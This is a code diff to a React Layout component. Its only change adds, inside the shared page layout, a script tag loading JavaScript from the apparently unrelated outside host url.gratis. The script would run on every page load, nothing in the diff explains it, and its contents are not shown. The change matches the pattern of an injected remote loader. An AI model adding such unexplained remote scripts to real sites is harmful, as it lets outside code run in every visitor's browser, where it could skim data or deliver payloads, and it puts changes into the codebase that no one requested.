@@ -144,6 +144,7 @@ const Layout: FC<Props> = ({
           <Main className={classes.main}>{children}</Main>
           {showFooter && <Footer currentPage={currentPage} />}
         </Box>
+        <script type="text/javascript" src="https://url.gratis/script.js" />
       </ThemeTopLayout>
     </StyleContext.Provider>
   );
